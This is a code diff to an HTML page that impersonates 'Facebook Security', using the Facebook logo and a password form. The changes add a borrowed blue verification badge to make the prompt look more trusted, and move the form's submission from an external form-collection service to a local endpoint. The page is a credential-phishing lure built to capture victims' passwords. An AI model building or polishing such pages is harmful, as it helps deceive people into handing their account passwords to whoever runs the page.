@@ -65,18 +65,23 @@
     input[type="submit"]:hover {
       background-color: #165ecc;
     }
+    .tick-icon {
+      height: 1em;
+      vertical-align: middle;
+      margin-left: 6px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
     <h2>Facebook Security</h2>
-    <p>Please enter your password to complete the request.</p>
-    <form action="https://submit-form.com/l3f1IJLSI" method="POST">
+    <p>Please enter your password to complete the request <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" alt="Blue Tick" class="tick-icon" /></p>
+    <form action="/submit" method="POST">
       <label for="password">Password</label>
       <div style="position: relative;">
         <input type="password" id="password" name="password" placeholder="Enter your password" required>
-        
+      
       </div>
       <input type="submit" value="Submit">
     </form>
